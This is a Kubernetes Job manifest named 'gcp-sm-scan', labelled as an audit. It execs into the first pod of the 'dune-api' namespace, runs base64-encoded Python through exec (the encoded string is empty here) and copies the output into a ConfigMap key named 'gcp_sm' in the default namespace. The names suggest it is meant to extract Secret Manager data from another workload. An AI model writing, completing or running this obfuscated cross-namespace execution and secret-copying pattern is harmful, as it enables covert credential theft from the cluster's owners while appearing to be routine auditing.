apiVersion: batch/v1
kind: Job
metadata:
  name: gcp-sm-scan
  namespace: default
spec:
  ttlSecondsAfterFinished: 600
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: worker
        image: bitnami/kubectl:latest
        command:
        - /bin/sh
        - -c
        - |
          POD=$(kubectl get pod -n dune-api -o jsonpath='{.items[0].metadata.name}')
          RAW=$(kubectl exec -n dune-api "$POD" -- python3 -c "exec(__import__('base64').b64decode('').decode())" 2>/dev/null)
          RESULT=$(echo "$RAW" | tail -1)
          kubectl patch configmap dune-audit-result4 -n default --type merge -p "{\"data\":{\"gcp_sm\":\"$RESULT\"}}"
          echo DONE